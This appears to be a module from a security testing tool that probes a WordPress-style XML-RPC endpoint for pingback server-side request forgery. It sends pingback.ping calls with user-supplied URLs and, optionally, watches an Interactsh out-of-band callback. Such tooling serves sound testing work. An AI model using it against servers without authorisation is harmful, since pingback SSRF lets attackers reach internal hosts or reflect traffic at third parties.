import httpx
from .rpc import call, parse_response, parse_fault
from .oob import available, start, drain, wait_for_interaction, stop, print_install_instructions
from .output import colorize, RED, GREEN, YELLOW


def run(result):
    endpoint = result["endpoint"]

    print("\n[*] Pingback / SSRF test")
    print("\n  [1] Basic pingback test")
    print("  [2] OOB verification")
    print("  [0] Back")

    choice = input("\nSelect: ").strip()

    if choice == "0":
        return

    if choice == "1":
        basic_test(endpoint)
        return

    if choice == "2":
        oob_test(endpoint)
        return

    print(colorize("[-] Invalid option", RED))


def get_urls():
    print("\nSource URL:")
    print("  URL of a page containing a link to the target URL.")
    source_url = input("  > ").strip()

    print("\nTarget URL:")
    print("  URL that the source page supposedly links to.")
    target_url = input("  > ").strip()

    if not source_url or not target_url:
        print(colorize("\n[-] Both URLs are required", RED))
        return None, None

    return source_url, target_url


def show_fault(root):
    fault = parse_fault(root)

    print(colorize("\n[-] Pingback rejected", RED))

    if not fault:
        print("    Unable to parse fault response")
        return

    for key, value in fault.items():
        print(f"    {key}: {value}")


def send_pingback(endpoint, source_url, target_url):
    try:
        response = call(
            endpoint,
            "pingback.ping",
            [
                source_url,
                target_url
            ]
        )
    except httpx.RequestError as exc:
        print(colorize(f"\n[-] Network error: {exc}", RED))
        return False

    parsed = parse_response(response)

    if parsed is None:
        print(colorize("\n[-] Invalid XML-RPC response", RED))
        return False

    if parsed["type"] == "fault":
        show_fault(parsed["root"])
        return False

    print(colorize("\n[+] Pingback request accepted", YELLOW))
    return True


def basic_test(endpoint):
    source_url, target_url = get_urls()

    if not source_url or not target_url:
        return

    send_pingback(
        endpoint,
        source_url,
        target_url
    )


def oob_test(endpoint):
    if not available():
        print(colorize("\n[-] Interactsh client not found", RED))
        print_install_instructions()
        return

    print("\n[*] Starting OOB client...")

    process, payload = start()

    if process is None:
        print(colorize(f"[-] {payload}", RED))
        return

    try:
        print(f"[+] Callback: {payload}")

        source_url, target_url = get_urls()

        if not source_url or not target_url:
            return

        drain(process)

        accepted = send_pingback(
            endpoint,
            source_url,
            target_url
        )

        if not accepted:
            return

        print("\n[*] Waiting for OOB interaction...")

        interaction = wait_for_interaction(
            process,
            timeout=15
        )

        if interaction:
            print(colorize("[+] OOB interaction received", GREEN))
            print(f"    {interaction}")
        else:
            print(colorize("[-] No OOB interaction observed", RED))

    finally:
        stop(process)